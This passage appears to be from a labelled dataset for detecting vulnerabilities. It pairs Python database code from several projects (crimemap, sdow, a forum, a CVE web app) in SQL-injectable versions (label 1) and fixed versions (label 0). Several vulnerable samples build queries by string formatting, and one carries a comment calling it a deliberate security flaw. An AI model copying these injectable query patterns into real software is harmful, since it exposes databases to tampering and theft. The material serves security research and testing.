configparser.ConfigParser()\nconfigParser.read(r'credentials/API-key')\n\napi_key = configParser.get('credentials', 'api_key')\napi_sec = configParser.get('credentials', 'api_secret')\n\n\n# read config\nconfigParser.read(r'config.txt')\n\ndb_path = configParser.get('config', 'db_path')\nverbose = configParser.get('config', 'verbose')\nsymbols = getlist(configParser.get('symbols', 'symbol_list'))\nintervals = getlist(configParser.get('intervals', 'interval_list'))\ntime_start = configParser.get('time', 'time_start')\ntime_end = configParser.get('time', 'time_end')\n\n\n# create timestamps for beginning and now\nif time_start == 'beginning':\n    time_start = 'January 1, 2000'\n\n\n# SET UP DATABASE CONNECTION AND BINANCE CLIENT\n\n# connect to database\ndb_con = sqlite3.connect(db_path)\n\n# cet up binance client\nclient = Client(api_key, api_sec)\n\n\n# GET DATA FOR ALL SYMBOLS AND INTERVALS\n\n# Loop over every symbol and every interval. Download historical data for each combination from binance.com which is not\n# already in the database and write it to the database\nfor symbol in symbols:\n    for interval in intervals:\n\n        # define name of table in database\n        table_name = (symbol + '_' + interval, )\n\n        # check if table already exists\n        with db_con:\n            cur = db_con.cursor()\n            cur.execute(\"SELECT name FROM sqlite_master WHERE type='table' AND name=?\", table_name)\n            if cur.fetchone() is None:\n                table_exists = False\n            else:\n                table_exists = True\n\n        # if table does not exist yet, create it and download all historical data.\n        # Note: the SQL-command 'IF NOT EXISTS' has no use here since get_historical_klines()\n        # cannot be used to update existing data\n        if not table_exists:\n            # create table\n            with db_con:\n                cur = db_con.cursor()\n                cur.execute('CREATE TABLE {}_{}('.format(symbol, interval) +\n                            't_open DATETIME, ' +\n                            'open FLOAT, ' +\n                            'high FLOAT, ' +\n                            'low FLOAT, ' +\n                            'close FLOAT, ' +\n                            'vol FLOAT, ' +\n                            't_close DATETIME, ' +\n                            'u_vol FLOAT, ' +\n                            'no_trds INT, ' +\n                            'tbBav FLOAT, ' +\n                            'tbQav FLOAT)')\n\n            # download data\n            output = client.get_historical_klines(symbol=symbol,\n                                                  interval=interval,\n                                                  start_str=time_start,\n                                                  end_str=time_end)\n\n            # write downloaded data to database\n            with db_con:\n                cur = db_con.cursor()\n                for x in range(0, len(output)):\n                    cur.execute('INSERT INTO {}_{} '.format(symbol, interval) +\n                                'VALUES({}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {})'.format(output[x][0],\n                                                                                            output[x][1],\n                                                                                            output[x][2],\n                                                                                            output[x][3],\n                                                                                            output[x][4],\n                                                                                            output[x][5],\n                                                                                            output[x][6],\n                                                                                            output[x][7],\n                                                                                            output[x][8],\n                                                                                            output[x][9],\n                                                                                            output[x][10]))\n\n            # print process to console if verbose mode is enabled\n            if verbose:\n                print('Symbol {}, interval {}: Historical data has been downloaded and saved to database'.format(symbol, interval))\n\n        # if table already exists and verbose mode is enabled print that to console\n        elif table_exists & (verbose == 'True'):\n            print('Symbol {}, interval {}: Table already exists in database. No data has been downloaded.'.format(symbol, interval))\n/n/n/n", "label": 1}, {"id": "c2bc9d0199ce90ae628efc10c51d252713caaeaf", "code": "dbhelper.py/n/n# -*- coding: utf-8 -*-\nimport pymysql\nimport db_config\n\n\nclass DBHelper:\n    \n    def connect(self, database=\"crimemap\"):\n        return pymysql.connect(host='localhost',\n                    user=db_config.db_user,\n                    password=db_config.db_password,\n                    db=database)\n\n    def get_all_inputs(self):\n        connection = self.connect()\n        try:\n            query = \"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n            return cursor.fetchall()\n        finally:\n            connection.close()\n\n    def add_input(self, data):\n        connection = self.connect()\n        try:\n            # protection from SQL Injections, previously use {}\n            # The following introduces a deliberate security flaw\n            query = \"INSERT INTO crimes (description) VALUES (%s);\"\n            with connection.cursor() as cursor:\n                cursor.execute(query, data)\n                connection.commit()\n        finally:\n            connection.close()\n\n    def clear_all(self):\n        connection = self.connect()\n        try:\n            query = \"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n    \n\n\n\n/n/n/n", "label": 0}, {"id": "c2bc9d0199ce90ae628efc10c51d252713caaeaf", "code": "/dbhelper.py/n/n# -*- coding: utf-8 -*-\nimport pymysql\nimport db_config\n\n\nclass DBHelper:\n    \n    def connect(self, database=\"crimemap\"):\n        return pymysql.connect(host='localhost',\n                    user=db_config.db_user,\n                    password=db_config.db_password,\n                    db=database)\n\n    def get_all_inputs(self):\n        connection = self.connect()\n        try:\n            query = \"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n            return cursor.fetchall()\n        finally:\n            connection.close()\n\n    def add_input(self, data):\n        connection = self.connect()\n        try:\n            # The following introduces a deliberate security flaw\n            query = \"INSERT INTO crimes (description) VALUES ('{}');\".format(data)\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n    def clear_all(self):\n        connection = self.connect()\n        try:\n            query = \"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n    \n\n\n\n/n/n/n", "label": 1}, {"id": "4db98f3521592f17550d2b723336f33fec5e112a", "code": "scripts/createMockDatabase.py/n/nimport sqlite3\n\nmock_database_filename = 'sdow.sqlite'\n\nprint '[INFO] Creating mock database: {0}'.format(mock_database_filename)\n\nconn = sqlite3.connect(mock_database_filename)\n\nconn.execute('DROP TABLE IF EXISTS pages')\nconn.execute('CREATE TABLE pages(id INTEGER PRIMARY KEY, name TEXT)')\n\nfor page_id in range(1, 101):\n  page_name = '*{0}_{1}*'.format(page_id, page_id)\n  conn.execute('INSERT INTO pages VALUES ({0}, \"{1}\")'.format(page_id, page_name))\n\nconn.execute('DROP TABLE IF EXISTS redirects')\nconn.execute('CREATE TABLE redirects(from_id INTEGER PRIMARY KEY, to_id INTEGER)')\n\nfor page_id in range(50, 60):\n  conn.execute('INSERT INTO redirects VALUES ({0}, {1})'.format(page_id, page_id + 10))\n\nconn.execute('DROP TABLE IF EXISTS links')\nconn.execute('CREATE TABLE links(from_id INTEGER, to_id INTEGER, PRIMARY KEY (from_id, to_id)) WITHOUT ROWID;')\n\nconn.execute('INSERT INTO links VALUES (1, 2)')\nconn.execute('INSERT INTO links VALUES (1, 4)')\nconn.execute('INSERT INTO links VALUES (1, 5)')\nconn.execute('INSERT INTO links VALUES (1, 10)')\nconn.execute('INSERT INTO links VALUES (2, 1)')\nconn.execute('INSERT INTO links VALUES (2, 3)')\nconn.execute('INSERT INTO links VALUES (2, 10)')\nconn.execute('INSERT INTO links VALUES (3, 4)')\nconn.execute('INSERT INTO links VALUES (3, 11)')\nconn.execute('INSERT INTO links VALUES (4, 1)')\nconn.execute('INSERT INTO links VALUES (4, 6)')\nconn.execute('INSERT INTO links VALUES (4, 9)')\nconn.execute('INSERT INTO links VALUES (5, 6)')\nconn.execute('INSERT INTO links VALUES (7, 8)')\nconn.execute('INSERT INTO links VALUES (8, 7)')\nconn.execute('INSERT INTO links VALUES (9, 3)')\nconn.execute('INSERT INTO links VALUES (11, 12)')\nconn.execute('INSERT INTO links VALUES (13, 12)')\nconn.execute('INSERT INTO links VALUES (15, 16)')\nconn.execute('INSERT INTO links VALUES (15, 17)')\nconn.execute('INSERT INTO links VALUES (16, 17)')\nconn.execute('INSERT INTO links VALUES (16, 18)')\nconn.execute('INSERT INTO links VALUES (17, 18)')\nconn.execute('INSERT INTO links VALUES (18, 19)')\nconn.execute('INSERT INTO links VALUES (19, 20)')\nconn.execute('INSERT INTO links VALUES (21, 20)')\nconn.execute('INSERT INTO links VALUES (22, 20)')\n\nconn.commit()\n\nprint '[INFO] Successfully created mock database: {0}'.format(mock_database_filename)\n/n/n/nsdow/database.py/n/n'''\nWrapper for connecting to the SDOW database.\n'''\n\nimport os.path\nimport sqlite3\nimport sdow.helpers as helpers\nfrom sdow.breadth_first_search import breadth_first_search\n\n\nclass Database():\n  '''\n  Wrapper for connecting to the SDOW database.\n  '''\n  def __init__(self, sqlite_filename):\n    if not os.path.isfile(sqlite_filename):\n      raise IOError('Specified SQLite file \"{0}\" does not exist.'.format(sqlite_filename))\n\n    self.conn = sqlite3.connect(sqlite_filename)\n    self.cursor = self.conn.cursor()\n\n    # TODO: measure the performance impact of this\n    self.cursor.arraysize = 1000\n\n  def __del__(self):\n    self.conn.close()\n\n  def fetch_page_id(self, page_name):\n    '''\n    Returns the page ID corresponding to the provided page name.\n\n    Args:\n      page_name: The page name whose ID to fetch.\n\n    Returns:\n      int: The page ID corresponding to the provided page name.\n\n    Raises:\n      ValueError: If the provided page name is invalid or does not exist.\n    '''\n    helpers.validate_page_name(page_name)\n\n    sanitized_page_name = page_name.replace(' ', '_')\n\n    query = 'SELECT id FROM pages WHERE name = ?;'\n    query_bindings = (sanitized_page_name,)\n    self.cursor.execute(query, query_bindings)\n\n    page_id = self.cursor.fetchone()\n\n    if not page_id:\n      raise ValueError('Invalid page name {0} provided. Page name does not exist.'.format(page_name))\n\n    return page_id[0]\n\n\n  def fetch_page_name(self, page_id):\n    '''\n    Returns the page name corresponding to the provided page ID.\n\n    Args:\n      page_id: The page ID whose ID to fetch.\n\n    Returns:\n      str: The page name corresponding to the provided page ID.\n\n    Raises:\n      ValueError: If the provided page ID is invalid or does not exist.\n    '''\n    helpers.validate_page_id(page_id)\n\n    query = 'SELECT name FROM pages WHERE id = ?;'\n    query_bindings = (page_id,)\n    self.cursor.execute(query, query_bindings)\n\n    page_name = self.cursor.fetchone()\n\n    if not page_name:\n      raise ValueError('Invalid page ID \"{0}\" provided. Page ID does not exist.'.format(page_id))\n\n    return page_name[0].encode('utf-8').replace('_', ' ')\n\n\n  def fetch_redirected_page_id(self, from_page_id):\n    '''\n    If the provided page ID is a redirect, returns the ID of the page to which it redirects.\n    Otherwise, returns None.\n\n    Args:\n      from_page_id: The page ID whose redirected page ID to fetch.\n\n    Returns:\n      int: The ID of the page to which the provided page ID redirects.\n      OR\n      None: If the provided page ID is not a redirect.\n\n    Raises:\n      ValueError: If the provided page ID is invalid.\n    '''\n    helpers.validate_page_id(from_page_id)\n\n    query = 'SELECT to_id FROM redirects WHERE from_id = ?'\n    query_bindings = (from_page_id,)\n    self.cursor.execute(query, query_bindings)\n\n    to_page_id = self.cursor.fetchone()\n\n    return to_page_id and to_page_id[0]\n\n  def compute_shortest_paths(self, from_page_id, to_page_id):\n    '''\n    Returns a list of page IDs indicating the shortest path between the from and to page IDs.\n\n    Args:\n      from_page_id: The ID corresponding to the page at which to start the search.\n      to_page_id: The ID corresponding to the page at which to end the search.\n\n    Returns:\n      [[int]]: A list of integer lists corresponding to the page IDs indicating the shortest path\n               between the from and to page IDs.\n\n    Raises:\n      ValueError: If either of the provided page IDs are invalid.\n    '''\n    helpers.validate_page_id(from_page_id)\n    helpers.validate_page_id(to_page_id)\n\n    return breadth_first_search(from_page_id, to_page_id, self)\n\n  def fetch_forwards_links(self, page_ids):\n    '''\n    Returns a list of tuples of page IDs representing forwards links from the list of provided page\n    IDs to other pages.\n\n    Args:\n      page_ids: The page IDs whose forwards links to fetch.\n\n    Returns:\n      [(int, int)]: A lists of integer tuples representing forwards links from the list of provided\n                    page IDs to other pages.\n    '''\n    return self.fetch_links_helper(page_ids, 'from_id')\n\n  def fetch_backwards_links(self, page_ids):\n    '''\n    Returns a list of tuples of page IDs representing backwards links from the list of provided page\n    IDs to other pages.\n\n    Args:\n      page_ids: The page IDs whose backwards links to fetch.\n\n    Returns:\n      [(int, int)]: A lists of integer tuples representing backwards links from the list of provided\n                    page IDs to other pages.\n    '''\n    return self.fetch_links_helper(page_ids, 'to_id')\n\n  def fetch_links_helper(self, page_ids, to_id_or_from_id):\n    '''\n    Helper function which handles duplicate logic for fetch_forwards_links() and\n    fetch_backwards_links().\n\n    Args:\n      page_ids: The page IDs whose links to fetch.\n      to_id_or_from_id: String which indicates whether to fetch forwards (\"from_id\") or backwards\n                        (\"to_id\") links.\n\n    Returns:\n      [(int, int)]: A lists of integer tuples representing links from the list of provided page IDs\n                    to other pages.\n    '''\n    #results = []\n    #for row in self.cursor.execute(query):\n    #  results.append(row)\n\n    # TODO: measure the performance impact of this versus just appending to an array (above) or\n    # just returning the cursor (not yet implemented)\n    # There is no need to escape the query parameters here since they are never user-defined\n    query = 'SELECT * FROM links WHERE {0} IN {1}'.format(to_id_or_from_id, page_ids)\n    self.cursor.execute(query)\n\n    return self.cursor.fetchall()\n/n/n/n", "label": 0}, {"id": "4db98f3521592f17550d2b723336f33fec5e112a", "code": "/scripts/createMockDatabase.py/n/nimport sqlite3\n\nmock_database_filename = 'sdow.sqlite'\n\nprint '[INFO] Creating mock database: {0}'.format(mock_database_filename)\n\nconn = sqlite3.connect(mock_database_filename)\n\nconn.execute('DROP TABLE IF EXISTS pages')\nconn.execute('CREATE TABLE pages(id INTEGER PRIMARY KEY, name TEXT)')\n\nfor page_id in range(1, 101):\n  page_name = '{0}_{1}'.format(page_id, page_id)\n  conn.execute('INSERT INTO pages VALUES ({0}, \"{1}\")'.format(page_id, page_name))\n\nconn.execute('DROP TABLE IF EXISTS redirects')\nconn.execute('CREATE TABLE redirects(from_id INTEGER PRIMARY KEY, to_id INTEGER)')\n\nfor page_id in range(50, 60):\n  conn.execute('INSERT INTO redirects VALUES ({0}, {1})'.format(page_id, page_id + 10))\n\nconn.execute('DROP TABLE IF EXISTS links')\nconn.execute('CREATE TABLE links(from_id INTEGER, to_id INTEGER, PRIMARY KEY (from_id, to_id)) WITHOUT ROWID;')\n\nconn.execute('INSERT INTO links VALUES (1, 2)')\nconn.execute('INSERT INTO links VALUES (1, 4)')\nconn.execute('INSERT INTO links VALUES (1, 5)')\nconn.execute('INSERT INTO links VALUES (1, 10)')\nconn.execute('INSERT INTO links VALUES (2, 1)')\nconn.execute('INSERT INTO links VALUES (2, 3)')\nconn.execute('INSERT INTO links VALUES (2, 10)')\nconn.execute('INSERT INTO links VALUES (3, 4)')\nconn.execute('INSERT INTO links VALUES (3, 11)')\nconn.execute('INSERT INTO links VALUES (4, 1)')\nconn.execute('INSERT INTO links VALUES (4, 6)')\nconn.execute('INSERT INTO links VALUES (4, 9)')\nconn.execute('INSERT INTO links VALUES (5, 6)')\nconn.execute('INSERT INTO links VALUES (7, 8)')\nconn.execute('INSERT INTO links VALUES (8, 7)')\nconn.execute('INSERT INTO links VALUES (9, 3)')\nconn.execute('INSERT INTO links VALUES (11, 12)')\nconn.execute('INSERT INTO links VALUES (13, 12)')\nconn.execute('INSERT INTO links VALUES (15, 16)')\nconn.execute('INSERT INTO links VALUES (15, 17)')\nconn.execute('INSERT INTO links VALUES (16, 17)')\nconn.execute('INSERT INTO links VALUES (16, 18)')\nconn.execute('INSERT INTO links VALUES (17, 18)')\nconn.execute('INSERT INTO links VALUES (18, 19)')\nconn.execute('INSERT INTO links VALUES (19, 20)')\nconn.execute('INSERT INTO links VALUES (21, 20)')\nconn.execute('INSERT INTO links VALUES (22, 20)')\n\nconn.commit()\n\nprint '[INFO] Successfully created mock database: {0}'.format(mock_database_filename)\n/n/n/n/sdow/database.py/n/n'''\nWrapper for connecting to the SDOW database.\n'''\n\nimport os.path\nimport sqlite3\nimport sdow.helpers as helpers\nfrom sdow.breadth_first_search import breadth_first_search\n\n\nclass Database():\n  '''\n  Wrapper for connecting to the SDOW database.\n  '''\n  def __init__(self, sqlite_filename):\n    if not os.path.isfile(sqlite_filename):\n      raise IOError('Specified SQLite file \"{0}\" does not exist.'.format(sqlite_filename))\n\n    self.conn = sqlite3.connect(sqlite_filename)\n    self.cursor = self.conn.cursor()\n\n    # TODO: measure the performance impact of this\n    self.cursor.arraysize = 1000\n\n  def __del__(self):\n    self.conn.close()\n\n  def fetch_page_id(self, page_name):\n    '''\n    Returns the page ID corresponding to the provided page name.\n\n    Args:\n      page_name: The page name whose ID to fetch.\n\n    Returns:\n      int: The page ID corresponding to the provided page name.\n\n    Raises:\n      ValueError: If the provided page name is invalid or does not exist.\n    '''\n    helpers.validate_page_name(page_name)\n\n    sanitized_page_name = page_name.replace(' ', '_')\n\n    print 'sanitized_page_name: {0}'.format(sanitized_page_name)\n\n    query = 'SELECT id FROM pages WHERE name=\"{0}\"'.format(sanitized_page_name)\n    self.cursor.execute(query)\n\n    page_id = self.cursor.fetchone()\n\n    if not page_id:\n      raise ValueError('Invalid page name {0} provided. Page name does not exist.'.format(page_name))\n\n    return page_id[0]\n\n\n  def fetch_page_name(self, page_id):\n    '''\n    Returns the page name corresponding to the provided page ID.\n\n    Args:\n      page_id: The page ID whose ID to fetch.\n\n    Returns:\n      str: The page name corresponding to the provided page ID.\n\n    Raises:\n      ValueError: If the provided page ID is invalid or does not exist.\n    '''\n    helpers.validate_page_id(page_id)\n\n    query = 'SELECT name FROM pages WHERE id=\"{0}\"'.format(page_id)\n    self.cursor.execute(query)\n\n    page_name = self.cursor.fetchone()\n\n    if not page_name:\n      raise ValueError('Invalid page ID \"{0}\" provided. Page ID does not exist.'.format(page_id))\n\n    return page_name[0].encode('utf-8').replace('_', ' ')\n\n\n  def fetch_redirected_page_id(self, from_page_id):\n    '''\n    If the provided page ID is a redirect, returns the ID of the page to which it redirects.\n    Otherwise, returns None.\n\n    Args:\n      from_page_id: The page ID whose redirected page ID to fetch.\n\n    Returns:\n      int: The ID of the page to which the provided page ID redirects.\n      OR\n      None: If the provided page ID is not a redirect.\n\n    Raises:\n      ValueError: If the provided page ID is invalid.\n    '''\n    helpers.validate_page_id(from_page_id)\n\n    query = 'SELECT to_id FROM redirects WHERE from_id=\"{0}\"'.format(from_page_id)\n    self.cursor.execute(query)\n\n    to_page_id = self.cursor.fetchone()\n\n    return to_page_id and to_page_id[0]\n\n  def compute_shortest_paths(self, from_page_id, to_page_id):\n    '''\n    Returns a list of page IDs indicating the shortest path between the from and to page IDs.\n\n    Args:\n      from_page_id: The ID corresponding to the page at which to start the search.\n      to_page_id: The ID corresponding to the page at which to end the search.\n\n    Returns:\n      [[int]]: A list of integer lists corresponding to the page IDs indicating the shortest path\n               between the from and to page IDs.\n\n    Raises:\n      ValueError: If either of the provided page IDs are invalid.\n    '''\n    helpers.validate_page_id(from_page_id)\n    helpers.validate_page_id(to_page_id)\n\n    return breadth_first_search(from_page_id, to_page_id, self)\n\n  def fetch_forwards_links(self, page_ids):\n    '''\n    Returns a list of tuples of page IDs representing forwards links from the list of provided page\n    IDs to other pages.\n\n    Args:\n      page_ids: The page IDs whose forwards links to fetch.\n\n    Returns:\n      [(int, int)]: A lists of integer tuples representing forwards links from the list of provided\n                    page IDs to other pages.\n    '''\n    return self.fetch_links_helper(page_ids, 'from_id')\n\n  def fetch_backwards_links(self, page_ids):\n    '''\n    Returns a list of tuples of page IDs representing backwards links from the list of provided page\n    IDs to other pages.\n\n    Args:\n      page_ids: The page IDs whose backwards links to fetch.\n\n    Returns:\n      [(int, int)]: A lists of integer tuples representing backwards links from the list of provided\n                    page IDs to other pages.\n    '''\n    return self.fetch_links_helper(page_ids, 'to_id')\n\n  def fetch_links_helper(self, page_ids, to_id_or_from_id):\n    '''\n    Helper function which handles duplicate logic for fetch_forwards_links() and\n    fetch_backwards_links().\n\n    Args:\n      page_ids: The page IDs whose links to fetch.\n      to_id_or_from_id: String which indicates whether to fetch forwards (\"from_id\") or backwards\n                        (\"to_id\") links.\n\n    Returns:\n      [(int, int)]: A lists of integer tuples representing links from the list of provided page IDs\n                    to other pages.\n    '''\n\n    query = 'SELECT from_id, to_id FROM links WHERE {0} IN {1}'.format(to_id_or_from_id, page_ids)\n\n    #results = []\n    #for row in self.cursor.execute(query):\n    #  results.append(row)\n\n    # TODO: measure the performance impact of this versus just appending to an array (above) or\n    # just returning the cursor (not yet implemented)\n    self.cursor.execute(query)\n\n    return self.cursor.fetchall()\n/n/n/n", "label": 1}, {"id": "1a5d6ccf02bec303d454f87a6bb39baed30c205f", "code": "vagrant/forum/forumdb.py/n/n# \"Database code\" for the DB Forum.\n\nimport psycopg2\n\nDBNAME = \"forum\"\n\ndef get_posts():\n  \"\"\"Return all posts from the 'database', most recent first.\"\"\"\n  db = psycopg2.connect(database=DBNAME)\n  c = db.cursor()\n  c.execute(\"select content,time from posts order by time desc\")\n  return c.fetchall()\n  db.close()\n\ndef add_post(content):\n  \"\"\"Add a post to the 'database' with the current timestamp.\"\"\"\n  db = psycopg2.connect(database=DBNAME)\n  c = db.cursor()\n  c.execute(\"insert into posts values(%s)\",(content,))\n  db.commit()\n  db.close()\n/n/n/n", "label": 0}, {"id": "1a5d6ccf02bec303d454f87a6bb39baed30c205f", "code": "/vagrant/forum/forumdb.py/n/n# \"Database code\" for the DB Forum.\n\nimport psycopg2\n\nDBNAME = \"forum\"\n\ndef get_posts():\n  \"\"\"Return all posts from the 'database', most recent first.\"\"\"\n  db = psycopg2.connect(database=DBNAME)\n  c = db.cursor()\n  c.execute(\"select content,time from posts order by time desc\")\n  return c.fetchall()\n  db.close()\n\ndef add_post(content):\n  \"\"\"Add a post to the 'database' with the current timestamp.\"\"\"\n  db = psycopg2.connect(database=DBNAME)\n  c = db.cursor()\n  c.execute(\"insert into posts values('%s')\" % content)\n  db.commit()\n  db.close()\n/n/n/n", "label": 1}, {"id": "49603ff9d29a9d411a681b3cc8096a6585ec1272", "code": "webapp/cve.py/n/n\"\"\"\nModule contains functions and CVE class for returning data from DB\n\"\"\"\n\n\nclass CVE:\n    \"\"\"\n    Class to hold CVE attributes\n    \"\"\"\n    cve_cwe_map = None\n\n    def __init__(self, cve_entry, column_names):\n        for col_name in column_names:\n            setattr(self, col_name, cve_entry[column_names.index(col_name)])\n        self.cwe = self.associate_cwes()\n\n    def associate_cwes(self):\n        \"\"\"\n        Assigns cve to cwe and creates a list\n        :return:\n        \"\"\"\n        cwe_map = []\n        if CVE.cve_cwe_map is not None:\n            cwe_map = [item[1] for item in CVE.cve_cwe_map if self.get_val(\"cve.id\") == item[0]]\n        return cwe_map\n\n    def get_val(self, attr_name):\n        \"\"\"\n        Return CVE attribute or None\n        :param attr_name: attr_name\n        :return: attribute\n        \"\"\"\n        value = None\n        if attr_name in vars(self):\n            value = getattr(self, attr_name)\n        return value\n\nclass CveAPI:\n    def __init__(self, cursor):\n        self.cursor = cursor\n\n    def process_list(self, data):\n        \"\"\"\n        This method returns details for given set of CVEs.\n\n        :param data: data obtained from api, we're interested in data[\"cve_list\"]\n\n        :returns: list of dictionaries containing detailed information for given cve list}\n\n        \"\"\"\n\n        cves_to_process = data[\"cve_list\"]\n        cves_to_process = filter(None, cves_to_process)\n        answer = {}\n        if not cves_to_process:\n            return answer\n\n        # Select all cves in request\n        cve_query = \"\"\"SELECT cve.id, cve.redhat_url, cve.secondary_url, cve.name, severity.name,\n                              cve.published_date, cve.modified_date, cve.iava, cve.description\n                         FROM cve\n                         LEFT JOIN severity ON cve.severity_id = severity.id\n                        WHERE cve.name IN %s\"\"\"\n        self.cursor.execute(cve_query, [tuple(cves_to_process)])\n        cves = self.cursor.fetchall()\n        cwe_map = self.get_cve_cwe_map([cve[column_names.index(\"cve.id\")] for cve in cves])  # generate cve ids\n        CVE.cve_cwe_map = cwe_map\n        cve_list = []\n        for cve_entry in cves:\n            cve = CVE(cve_entry, column_names)\n            cve_list.append(cve)\n\n        return self.construct_answer(cve_list)\n\n\n    def get_cve_cwe_map(self, ids):\n        \"\"\"\n        For givers CVE ids find CWE in DB\n        :param ids: CVE ids\n        :return: cve_cwe mapping\n        \"\"\"\n        if not ids:\n            return []\n        query = \"\"\"SELECT cve_id, cwe.name, cwe.link\n                     FROM cve_cwe map\n                     JOIN cwe ON map.cwe_id = cwe.id\n                    WHERE map.cve_id IN %s\"\"\"\n        self.cursor.execute(query, [tuple(ids)])\n        return self.cursor.fetchall()\n\n\n    @staticmethod\n    def construct_answer(cve_list):\n        \"\"\"\n        Final dictionary generation\n        :param cve_list: which cves to show\n        :return: JSON ready dictionary\n        \"\"\"\n        response = {}\n        for cve in cve_list:\n            response[cve.get_val(\"cve.name\")] = {\n                \"redhat_url\": cve.get_val(\"redhat_url\"),\n                \"secondary_url\": cve.get_val(\"secondary_url\"),\n                \"synopsis\": cve.get_val(\"cve.name\"),\n                \"impact\": cve.get_val(\"severity.name\"),\n                \"public_date\": cve.get_val(\"published_date\"),\n                \"modified_date\": cve.get_val(\"modified_date\"),\n                \"iava\": cve.get_val(\"iava\"),\n                \"cwe_list\": cve.get_val(\"cwe\"),\n                \"description\": cve.get_val(\"description\"),\n            }\n        return response\n/n/n/nwebapp/errata.py/n/n\"\"\"\nModule contains classes for returning errata data from DB\n\"\"\"\n\nclass Errata:\n    \"\"\"\n    Class to hold Erratum attributes\n    \"\"\"\n\n    def __init__(self, id, name, synopsis, severity, description, solution, issued, updated):\n        setattr(self, \"name\", name)\n        setattr(self, \"id\", id)\n        mydict = {}\n        mydict[\"type\"] = None\n        mydict[\"issued\"] = str(issued)\n        mydict[\"synopsis\"] = synopsis\n        mydict[\"description\"] = description\n        mydict[\"solution\"] = solution\n        mydict[\"severity\"] = severity\n        mydict[\"summary\"] = None\n        mydict[\"updated\"] = str(updated)\n        mydict[\"url\"] = \"https://access.redhat.com/errata/%s\" % name\n        mydict[\"bugzilla_list\"] = []\n        mydict[\"cve_list\"] = []\n        mydict[\"package_list\"] = []\n        mydict[\"reference_list\"] = []\n        setattr(self, \"mydict\", mydict)\n\n    def set_cve_names(self, cve_name_list):\n        mydict = self.get_val(\"mydict\")\n        mydict[\"cve_list\"] = cve_name_list\n\n    def set_packages(self, package_list):\n        mydict = self.get_val(\"mydict\")\n        mydict[\"package_list\"] = package_list\n\n    def get_val(self, attr_name):\n        \"\"\"\n        Return Erratum attribute or None\n        :param attr_name: attr_name\n        :return: attribute\n        \"\"\"\n        value = None\n        if attr_name in vars(self):\n            value = getattr(self, attr_name)\n        return value\n\nclass ErrataAPI:\n    def __init__(self, cursor):\n        self.cursor = cursor\n\n    def get_cve_names_for_erratum_id(self, id):\n        \"\"\"\n        Get the list of cves for the given erratum id\n        \"\"\"\n        cve_query = \"\"\"SELECT name FROM cve\n                         JOIN errata_cve ON cve_id = cve.id\n                        WHERE errata_cve.errata_id = %s\"\"\"\n        self.cursor.execute(cve_query, (id,))\n        cve_names = self.cursor.fetchall()\n        cve_name_list = []\n        for cve_name in cve_names:\n            cve_name_list.append(cve_name[0])\n        return cve_name_list\n\n    @staticmethod\n    def build_package_name(name, epoch, version, release, arch):\n        \"\"\"\n        Build a package name from the separate NEVRA parts\n        \"\"\"\n        package_name = name + \"-\"\n        if int(epoch) > 0:\n            package_name += \"%s:\" % epoch\n        package_name += \"%s-%s.%s\" % (version, release, arch)\n        return package_name\n\n    def get_package_list_for_erratum_id(self, id):\n        \"\"\"\n        Get the list of packages for the given erratum id\n        \"\"\"\n        pkg_query = \"\"\"SELECT package.name, evr.epoch, evr.version, evr.release, arch.name\n                         FROM pkg_errata\n                         JOIN package ON package.id = pkg_errata.pkg_id\n                         JOIN evr ON evr.id = package.evr_id\n                         JOIN arch ON arch.id = package.arch_id\n                        WHERE pkg_errata.errata_id = %s\"\"\"\n        self.cursor.execute(pkg_query, (id,))\n        result = self.cursor.fetchall()\n        package_list = []\n        for name, epoch, version, release, arch in result:\n            package_list.append(self.build_package_name(name, epoch, version, release, arch))\n        return package_list\n\n    def process_list(self, data):\n        \"\"\"\n        This method returns details for given set of Errata.\n\n        :param cursor: psycopg2 connection cursor\n        :param data: data obtained from api, we're interested in data[\"errata_list\"]\n\n        :returns: dictionary containing detailed information for given errata list}\n\n        \"\"\"\n\n        errata_to_process = data[\"errata_list\"]\n        errata_to_process = filter(None, errata_to_process)\n        answer = {}\n\n        if not errata_to_process:\n            return answer\n\n        # Select all errata in request\n        errata_query = \"\"\"SELECT errata.id, errata.name, synopsis, severity.name, description,\n                                 solution, issued, updated\n                            FROM errata\n                            LEFT JOIN severity ON severity_id = severity.id\n                           WHERE errata.name IN %s\"\"\"\n        self.cursor.execute(errata_query, [tuple(errata_to_process)])\n        errata = self.cursor.fetchall()\n\n        erratum_list = []\n        for id, name, synopsis, severity, description, solution, issued, updated in errata:\n            new_erratum = Errata(id, name, synopsis, severity, description, solution, issued, updated)\n            new_erratum.set_cve_names(self.get_cve_names_for_erratum_id(id))\n            new_erratum.set_packages(self.get_package_list_for_erratum_id(id))\n            erratum_list.append(new_erratum)\n\n        errata_dict = {}\n        for e in erratum_list:\n            errata_dict[e.get_val(\"name\")] = e.get_val(\"mydict\")\n        answer[\"errata_list\"] = errata_dict\n        return answer\n/n/n/nwebapp/updates.py/n/n#!/usr/bin/python -u\n\n\ndef split_filename(filename):\n    \"\"\"\n    Pass in a standard style rpm fullname\n\n    Return a name, version, release, epoch, arch, e.g.::\n        foo-1.0-1.i386.rpm returns foo, 1.0, 1, 0, i386\n        bar-1:9-123a.ia64.rpm returns bar, 9, 123a, 1, ia64\n    \"\"\"\n\n    is_epoch = True if filename.find(':') != -1 else False\n\n    if filename[-4:] == '.rpm':\n        filename = filename[:-4]\n\n    arch_index = filename.rfind('.')\n    arch = filename[arch_index + 1:]\n\n    rel_index = filename[:arch_index].rfind('-')\n    rel = filename[rel_index + 1:arch_index]\n\n    if is_epoch:\n        ver_index = filename[:rel_index].rfind(':')\n    else:\n        ver_index = filename[:rel_index].rfind('-')\n    ver = filename[ver_index + 1:rel_index]\n\n\n    if is_epoch:\n        epoch_index = filename[:ver_index].rfind('-')\n        epoch = filename[epoch_index + 1:ver_index]\n    else:\n        epoch_index = ver_index\n        epoch = '0'\n\n    name = filename[:epoch_index]\n    return name, ver, rel, epoch, arch\n\n\nclass UpdatesAPI:\n    def __init__(self, cursor):\n        self.cursor = cursor\n\n    def process_list(self, data):\n        \"\"\"\n        This method is looking for updates of a package, including name of package to update 